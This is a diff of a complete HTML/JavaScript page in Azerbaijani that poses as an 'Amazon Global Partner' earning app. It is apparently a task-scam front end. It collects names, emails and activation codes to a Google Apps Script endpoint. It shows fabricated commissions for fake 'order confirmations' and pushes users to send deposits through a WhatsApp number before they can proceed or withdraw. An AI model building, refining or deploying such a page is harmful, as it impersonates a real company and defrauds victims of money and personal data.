@@ -5,130 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#f3f4f6">
     <title>JET-SHOP | Amazon Global Partner</title>
-    
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
     <style>
-        :root {
-            --primary: #ff9900; /* Amazon Orange */
-            --secondary: #232f3e; /* Amazon Dark Blue */
-            --success: #00b894;
-            --bg: #f3f4f6;
-            --white: #ffffff;
-            --text: #2d3436;
-        }
-
+        :root { --primary: #ff9900; --secondary: #232f3e; --success: #00b894; --bg: #f3f4f6; --white: #ffffff; --text: #2d3436; }
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        
-        body {
-            margin: 0; padding: 0;
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Poppins', sans-serif;
-            overflow-x: hidden;
-        }
-
-        /* --- AUTH SCREEN --- */
-        #authScreen {
-            position: fixed; inset: 0; z-index: 9999;
-            background: var(--white);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            padding: 20px;
-        }
+        body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: 'Poppins', sans-serif; overflow-x: hidden; }
+        #authScreen { position: fixed; inset: 0; z-index: 9999; background: var(--white); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .auth-logo { width: 150px; margin-bottom: 20px; }
-        .auth-box { width: 100%; max-width: 350px; text-align: center; }
-        .auth-inp {
-            width: 100%; padding: 15px; margin-bottom: 15px;
-            border: 1px solid #dfe6e9; border-radius: 10px; font-size: 16px;
-        }
-        .btn-login {
-            width: 100%; padding: 15px; background: var(--primary);
-            color: var(--white); border: none; border-radius: 10px;
-            font-weight: 700; font-size: 18px; cursor: pointer;
-        }
-
-        /* --- APP HEADER --- */
-        header {
-            background: var(--secondary); color: white;
-            padding: 15px; position: sticky; top: 0; z-index: 100;
-            display: flex; justify-content: space-between; align-items: center;
-        }
+        .auth-inp { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #dfe6e9; border-radius: 10px; font-size: 16px; text-align: center; }
+        .btn-login { width: 100%; padding: 15px; background: var(--primary); color: var(--white); border: none; border-radius: 10px; font-weight: 700; font-size: 18px; cursor: pointer; }
+        header { background: var(--secondary); color: white; padding: 15px; position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; }
         .logo-text { font-weight: 700; font-size: 20px; color: var(--primary); }
         .bal-card { background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px; font-size: 14px; }
-
-        /* --- MAIN VIEWS --- */
-        .view { display: none; padding: 15px; padding-bottom: 100px; animation: fadeIn 0.3s; }
+        .view { display: none; padding: 15px; padding-bottom: 100px; }
         .view.active { display: block; }
-        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
-
-        /* --- HOME: VIP LEVELS --- */
-        .banner-home {
-            width: 100%; height: 160px; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://m.media-amazon.com/images/G/01/sell/images/prime-day/recirc/PS23_PrimeDay_The_Lowdown_v2_1x.jpg') center/cover;
-            border-radius: 15px; display: flex; flex-direction: column; justify-content: center; padding: 20px; color: white; margin-bottom: 20px;
-        }
+        .banner-home { width: 100%; height: 160px; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://m.media-amazon.com/images/G/01/sell/images/prime-day/recirc/PS23_PrimeDay_The_Lowdown_v2_1x.jpg') center/cover; border-radius: 15px; display: flex; flex-direction: column; justify-content: center; padding: 20px; color: white; margin-bottom: 20px; }
         .vip-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .vip-card {
-            background: var(--white); border-radius: 15px; padding: 15px;
-            text-align: center; border: 1px solid #eee; box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-        }
-        .vip-card img { width: 50px; margin-bottom: 10px; }
-        .vip-card h3 { margin: 0; font-size: 16px; }
-        .vip-card p { font-size: 12px; color: #636e72; margin: 5px 0; }
-        .vip-card .status { font-size: 11px; font-weight: bold; color: var(--primary); }
-
-        /* --- GRAB SCREEN --- */
-        .grab-stats {
-            background: var(--secondary); color: white; padding: 20px;
-            border-radius: 15px; display: flex; justify-content: space-between; margin-bottom: 20px;
-        }
+        .vip-card { background: var(--white); border-radius: 15px; padding: 15px; text-align: center; border: 1px solid #eee; box-shadow: 0 4px 6px rgba(0,0,0,0.05); cursor: pointer; }
+        .grab-stats { background: var(--secondary); color: white; padding: 20px; border-radius: 15px; display: flex; justify-content: space-between; margin-bottom: 20px; }
         .stat-item { text-align: center; }
         .stat-item span { display: block; font-size: 12px; opacity: 0.7; }
-        .stat-item b { font-size: 18px; }
-
-        .product-card {
-            background: white; border-radius: 15px; padding: 20px; text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
-        .prod-img { width: 150px; height: 150px; object-fit: contain; margin-bottom: 15px; }
-        .btn-grab {
-            width: 100%; padding: 18px; background: var(--primary);
-            border: none; border-radius: 12px; color: white; font-weight: 700;
-            font-size: 18px; margin-top: 15px; box-shadow: 0 5px 15px rgba(255,153,0,0.3);
-        }
-
-        /* --- PROFILE --- */
-        .profile-header {
-            background: white; padding: 25px; border-radius: 15px; margin-bottom: 20px;
-            display: flex; align-items: center; gap: 15px;
-        }
-        .avatar { width: 60px; height: 60px; background: #dfe6e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; }
-        
-        .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .act-btn {
-            padding: 15px; border-radius: 10px; border: none; font-weight: 600;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .btn-dep { background: var(--success); color: white; }
-        .btn-with { background: var(--secondary); color: white; }
-
-        /* --- BOTTOM NAV --- */
-        .navbar {
-            position: fixed; bottom: 0; width: 100%; height: 70px;
-            background: var(--white); border-top: 1px solid #eee;
-            display: flex; justify-content: space-around; align-items: center; z-index: 100;
-        }
+        .product-card { background: white; border-radius: 15px; padding: 20px; text-align: center; }
+        .prod-img { width: 140px; height: 140px; object-fit: contain; margin-bottom: 15px; }
+        .btn-grab { width: 100%; padding: 18px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; font-size: 18px; margin-top: 15px; }
+        .navbar { position: fixed; bottom: 0; width: 100%; height: 70px; background: var(--white); border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; z-index: 100; }
         .nav-item { display: flex; flex-direction: column; align-items: center; color: #b2bec3; font-size: 11px; font-weight: 600; cursor: pointer; }
         .nav-item.active { color: var(--primary); }
-        .nav-item i { font-size: 22px; margin-bottom: 4px; }
-
-        /* MODAL */
-        #grabModal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
-            z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px;
-        }
+        #grabModal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: white; padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; text-align: center; }
-
     </style>
 </head>
 <body>
@@ -136,12 +41,10 @@
     <div id="authScreen">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="auth-logo">
         <div class="auth-box">
-            <h2 style="margin-bottom: 30px;">Xoş Gəlmisiniz</h2>
             <input type="text" id="rName" class="auth-inp" placeholder="Adınız">
             <input type="email" id="rEmail" class="auth-inp" placeholder="Email">
             <input type="text" id="rCode" class="auth-inp" placeholder="Aktivasiya Kodu">
-            <button class="btn-login" onclick="handleLogin()">DAXİL OL</button>
-            <p style="font-size: 13px; color: #888; margin-top: 15px;" onclick="wa('Mənə yeni JET-SHOP kodu lazımdır')">Hesabınız yoxdur? <b>Kod əldə edin</b></p>
+            <button class="btn-login" id="loginBtn" onclick="handleLogin()">DAXİL OL</button>
         </div>
     </div>
 
@@ -152,67 +55,40 @@
         </header>
 
         <div id="v-home" class="view active">
-            <div class="banner-home">
-                <h2 style="margin:0;">Amazon Partners</h2>
-                <p>Günlük Dropshipping tapşırıqlarını tamamla, 5% qazan.</p>
-            </div>
-
-            <div style="font-weight:700; margin-bottom:15px;">MƏRKƏZİ MAĞAZALAR</div>
+            <div class="banner-home"><h2>Amazon Partner</h2><p>Günlük tapşırıqlar, yüksək gəlir.</p></div>
             <div class="vip-grid">
-                <div class="vip-card" onclick="nav('grab')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
-                    <h3>Amazon VIP 1</h3>
-                    <p>Günlük 5 tapşırıq</p>
-                    <div class="status">AKTİVDİR</div>
-                </div>
-                <div class="vip-card" style="opacity: 0.6;" onclick="alert('Balansınız $100 olmalıdır')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
-                    <h3>Amazon VIP 2</h3>
-                    <p>Günlük 10 tapşırıq</p>
-                    <div class="status">KİLİDLİ</div>
-                </div>
+                <div class="vip-card" onclick="nav('grab')"><img src="https://cdn-icons-png.flaticon.com/512/732/732190.png" width="40"><br><h3>Amazon VIP 1</h3><p>Limit: 5 Sifariş</p><b style="color:var(--primary)">AKTİVDİR</b></div>
+                <div class="vip-card" style="opacity:0.6" onclick="alert('Balansınız $100 olmalıdır')"><img src="https://cdn-icons-png.flaticon.com/512/732/732190.png" width="40"><br><h3>Alibaba VIP 2</h3><p>Limit: 10 Sifariş</p><b>KİLİDLİ</b></div>
             </div>
         </div>
 
         <div id="v-grab" class="view">
             <div class="grab-stats">
-                <div class="stat-item"><span>Günlük Qazanc</span><b id="todayEarn">$0.00</b></div>
-                <div class="stat-item"><span>Tapşırıqlar</span><b id="taskCount">0 / 5</b></div>
+                <div class="stat-item"><span>Bugünlük</span><b id="todayEarn">$0.00</b></div>
+                <div class="stat-item"><span>Tamamlanıb</span><b id="taskCount">0 / 5</b></div>
             </div>
-
             <div class="product-card">
                 <img id="prodImg" src="https://m.media-amazon.com/images/I/71jG+e7roXL._AC_SL1500_.jpg" class="prod-img">
-                <h3 id="prodTitle">Apple iPhone 15 Pro Max</h3>
-                <p style="color:var(--primary); font-weight:700; font-size:20px;">Qiymət: $1,199</p>
-                <p style="font-size: 13px; color: #888;">Sizin Komissiyanız: $2.40</p>
+                <h3 id="prodTitle" style="font-size:16px;">Yüklənir...</h3>
+                <p id="prodPrice" style="color:var(--primary); font-weight:700; font-size:20px;">$0.00</p>
                 <button class="btn-grab" id="grabBtn" onclick="processOrder()">SİFARİŞİ TƏSDİQLƏ</button>
             </div>
         </div>
 
         <div id="v-profile" class="view">
-            <div class="profile-header">
-                <div class="avatar"><i class="fa-solid fa-user"></i></div>
-                <div>
-                    <h3 id="userName" style="margin:0;">İstifadəçi</h3>
-                    <p id="userEmail" style="margin:0; font-size:12px; color:#888;"></p>
-                </div>
+            <div style="background:white; padding:20px; border-radius:15px; text-align:center; margin-bottom:20px;">
+                <div style="width:70px; height:70px; background:#eee; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 10px; font-size:30px;"><i class="fa-solid fa-user"></i></div>
+                <h3 id="userName" style="margin:0;">İstifadəçi</h3>
+                <p id="userEmail" style="margin:0; font-size:12px; color:#888;"></p>
             </div>
-
-            <div class="grab-stats" style="background: white; color: var(--text); border: 1px solid #eee;">
-                <div class="stat-item"><span>Ümumi Balans</span><b id="profBal">$0.00</b></div>
-                <div class="stat-item"><span>Dondurulmuş</span><b>$0.00</b></div>
-            </div>
-
-            <div class="action-grid">
-                <button class="act-btn btn-dep" onclick="wa('Salam, Balansımı artırmaq istəyirəm')"><i class="fa-solid fa-wallet"></i> Depozit</button>
-                <button class="act-btn btn-with" onclick="withdraw()"><i class="fa-solid fa-arrow-up-right-from-square"></i> Çıxarış</button>
-            </div>
+            <button class="btn-login" style="background:var(--success); margin-bottom:10px;" onclick="wa('Sifariş üçün balans artırmaq istəyirəm')">DEPОZİT</button>
+            <button class="btn-login" style="background:var(--secondary)" onclick="withdraw()">PULU ÇƏK</button>
         </div>
 
         <nav class="navbar">
-            <div class="nav-item active" id="n-home" onclick="nav('home')"><i class="fa-solid fa-house"></i><span>Ana Səhifə</span></div>
-            <div class="nav-item" id="n-grab" onclick="nav('grab')"><i class="fa-solid fa-hand-pointer"></i><span>Sifariş</span></div>
-            <div class="nav-item" id="n-profile" onclick="nav('profile')"><i class="fa-solid fa-user"></i><span>Profil</span></div>
+            <div class="nav-item active" id="n-home" onclick="nav('home')"><i class="fa-solid fa-house"></i><span>Home</span></div>
+            <div class="nav-item" id="n-grab" onclick="nav('grab')"><i class="fa-solid fa-hand-pointer"></i><span>Grab</span></div>
+            <div class="nav-item" id="n-profile" onclick="nav('profile')"><i class="fa-solid fa-circle-user"></i><span>Profil</span></div>
         </nav>
     </div>
 
@@ -220,56 +96,44 @@
         <div class="modal-content">
             <div id="modalLoading">
                 <i class="fa-solid fa-circle-notch fa-spin" style="font-size:40px; color:var(--primary);"></i>
-                <p>Sistem Amazon anbarına bağlanır...</p>
+                <p>Məhsul yoxlanılır...</p>
             </div>
             <div id="modalSuccess" style="display:none;">
                 <i class="fa-solid fa-circle-check" style="font-size:40px; color:var(--success);"></i>
-                <h3>Sifariş Uğurlu!</h3>
-                <p>Komissiya hesabınıza əlavə edildi.</p>
+                <h3>Uğurlu!</h3>
+                <p>Komissiya balansınıza əlavə edildi.</p>
                 <button class="btn-login" onclick="closeModal()">DAVAM ET</button>
             </div>
         </div>
     </div>
 
     <script>
+        const API = "https://script.google.com/macros/s/AKfycbwxptBKZ9pDn_HkmR8MAsWtkf73Q0c971ClR6JrpQPWyC0NitfN7uBmjl0F1A3fWW6c/exec";
         const WA_NUM = "994507516137";
-        const API = "https://script.google.com/macros/s/AKfycbw5TG1rIhVZ_jqZjLy08KiTAC0YqrMc0QXD5Us22E4rpcb3hARRhW6LauxhZhwTpqmSCQ/exec";
-
         let user = { name: "", email: "", balance: 0, deposit: 0, tasks: 0, todayEarn: 0 };
-
-        const products = [
-            { t: "Apple iPhone 15 Pro Max", i: "https://m.media-amazon.com/images/I/71jG+e7roXL._AC_SL1500_.jpg", p: 1200, c: 2.40 },
-            { t: "Sony WH-1000XM5 Headphones", i: "https://m.media-amazon.com/images/I/51SKmu2G9FL._AC_SL1500_.jpg", p: 350, c: 1.20 },
-            { t: "Samsung Galaxy Watch 6", i: "https://m.media-amazon.com/images/I/61fI-B4H-jL._AC_SL1500_.jpg", p: 299, c: 0.90 },
-            { t: "MacBook Air M2", i: "https://m.media-amazon.com/images/I/719C6bJv8jL._AC_SL1500_.jpg", p: 999, c: 3.50 }
+        const prods = [
+            { t: "Apple iPhone 15 Pro", i: "https://m.media-amazon.com/images/I/81SigAnN7pL._AC_SL1500_.jpg", p: 1099, c: 2.50 },
+            { t: "Samsung S24 Ultra", i: "https://m.media-amazon.com/images/I/71RVuSReZAL._AC_SL1500_.jpg", p: 1299, c: 3.10 },
+            { t: "Sony PlayStation 5", i: "https://m.media-amazon.com/images/I/5105XzkoqQL._AC_SL1500_.jpg", p: 499, c: 1.80 },
+            { t: "iPad Pro M2", i: "https://m.media-amazon.com/images/I/81gC7frWXYL._AC_SL1500_.jpg", p: 899, c: 2.20 }
         ];
 
-        window.onload = () => {
-            if(localStorage.getItem('js_data')) {
-                user = JSON.parse(localStorage.getItem('js_data'));
-                showApp();
-            }
-        };
-
-        function wa(txt) { window.location.href = `https://wa.me/${WA_NUM}?text=${encodeURIComponent(txt)}`; }
+        window.onload = () => { if(localStorage.getItem('js_final_data')) { user = JSON.parse(localStorage.getItem('js_final_data')); showApp(); } };
+        function wa(t) { window.location.href = `https://wa.me/${WA_NUM}?text=${encodeURIComponent(t)}`; }
 
         async function handleLogin() {
-            let n = document.getElementById('rName').value;
-            let e = document.getElementById('rEmail').value;
-            let c = document.getElementById('rCode').value;
-
+            let n = document.getElementById('rName').value, e = document.getElementById('rEmail').value, c = document.getElementById('rCode').value;
             if(!n || !e || !c) return alert("Bütün xanaları doldurun");
-
+            document.getElementById('loginBtn').innerText = "Yoxlanılır...";
             try {
                 let res = await fetch(`${API}?action=login&name=${encodeURIComponent(n)}&email=${encodeURIComponent(e)}&code=${encodeURIComponent(c)}`);
                 let data = await res.json();
                 if(data.result === 'success') {
                     user = { name: n, email: e, balance: parseFloat(data.balance), deposit: parseFloat(data.balance), tasks: 0, todayEarn: 0 };
                     save(); showApp();
-                } else {
-                    alert(data.msg);
-                }
-            } catch(err) { alert("Xəta baş verdi"); }
+                } else alert(data.msg);
+            } catch(x) { alert("Xəta! Yenidən yoxlayın."); }
+            document.getElementById('loginBtn').innerText = "DAXİL OL";
         }
 
         function showApp() {
@@ -282,60 +146,52 @@
 
         function updateUI() {
             document.getElementById('balVal').innerText = `$${user.balance.toFixed(2)}`;
-            document.getElementById('profBal').innerText = `$${user.balance.toFixed(2)}`;
-            document.getElementById('todayEarn').innerText = `$${user.todayEarn.toFixed(2)}`;
             document.getElementById('taskCount').innerText = `${user.tasks} / 5`;
-            localStorage.setItem('js_data', JSON.stringify(user));
+            document.getElementById('todayEarn').innerText = `$${user.todayEarn.toFixed(2)}`;
+            save();
         }
 
-        function nav(page) {
+        function nav(p) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById('v-' + page).classList.add('active');
-            document.getElementById('n-' + page).classList.add('active');
+            document.getElementById('v-' + p).classList.add('active');
+            document.getElementById('n-' + p).classList.add('active');
+            if(p === 'grab') loadProd();
+        }
+
+        function loadProd() {
+            let pr = prods[Math.floor(Math.random() * prods.length)];
+            document.getElementById('prodImg').src = pr.i;
+            document.getElementById('prodTitle').innerText = pr.t;
+            document.getElementById('prodPrice').innerText = `$${pr.p}`;
+            user.currentComm = pr.c;
+        }
+
+        async function processOrder() {
+            if(user.tasks >= 5) return alert("Bugünlük limit bitib. Sabah yenidən cəhd edin.");
+            if(user.balance < 5) return wa("Sifariş üçün balansınız ən az $5 olmalıdır. Artırmaq istəyirəm.");
             
-            if(page === 'grab') loadRandomProduct();
-        }
-
-        function loadRandomProduct() {
-            let p = products[Math.floor(Math.random() * products.length)];
-            document.getElementById('prodImg').src = p.i;
-            document.getElementById('prodTitle').innerText = p.t;
-            user.currentComm = p.c;
-        }
-
-        function processOrder() {
-            if(user.tasks >= 5) return alert("Bugünlük limit bitib. Sabah yenidən gəlin.");
-            if(user.balance < 10) return wa("Sifariş üçün minimum balans $10 olmalıdır. Balans artırmaq istəyirəm.");
-
             document.getElementById('grabModal').style.display = 'flex';
             document.getElementById('modalLoading').style.display = 'block';
             document.getElementById('modalSuccess').style.display = 'none';
 
-            setTimeout(() => {
+            setTimeout(async () => {
                 user.tasks++;
                 user.balance += user.currentComm;
                 user.todayEarn += user.currentComm;
+                updateUI();
+                
+                // Backend Sync
+                fetch(`${API}?action=updateBal&email=${user.email}&newBalance=${user.balance.toFixed(2)}`, {mode:'no-cors'});
+                
                 document.getElementById('modalLoading').style.display = 'none';
                 document.getElementById('modalSuccess').style.display = 'block';
-                updateUI();
-            }, 2500);
+            }, 2000);
         }
 
-        function closeModal() {
-            document.getElementById('grabModal').style.display = 'none';
-            loadRandomProduct();
-        }
-
-        function withdraw() {
-            if(user.balance > user.deposit) {
-                wa(`ID: ${user.email}. Balans: $${user.balance}. Çıxarış etmək istəyirəm.`);
-            } else {
-                alert("Çıxarış üçün minimum $1 qazanc əldə etməlisiniz.");
-            }
-        }
-
-        function save() { localStorage.setItem('js_data', JSON.stringify(user)); }
+        function closeModal() { document.getElementById('grabModal').style.display = 'none'; loadProd(); }
+        function withdraw() { if(user.balance > user.deposit) wa(`ID: ${user.email}. Balansım: $${user.balance.toFixed(2)}. Pulu çəkmək istəyirəm.`); else alert("Çıxarış üçün ən azı 1 tapşırıq tamamlamalısınız."); }
+        function save() { localStorage.setItem('js_final_data', JSON.stringify(user)); }
     </script>
 </body>
 </html>
